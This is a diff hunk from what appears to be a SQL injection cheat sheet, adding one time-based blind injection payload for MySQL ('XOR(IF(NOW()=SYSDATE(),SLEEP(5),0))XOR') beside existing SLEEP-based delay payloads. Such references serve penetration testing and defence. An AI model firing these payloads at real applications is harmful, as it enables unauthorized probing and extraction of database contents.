@@ -374,6 +374,7 @@ The following SQL codes will delay the output from MySQL.
     ```sql
     RLIKE SLEEP([SLEEPTIME])
     OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
     ```
 
 ### Using SLEEP in a subselect
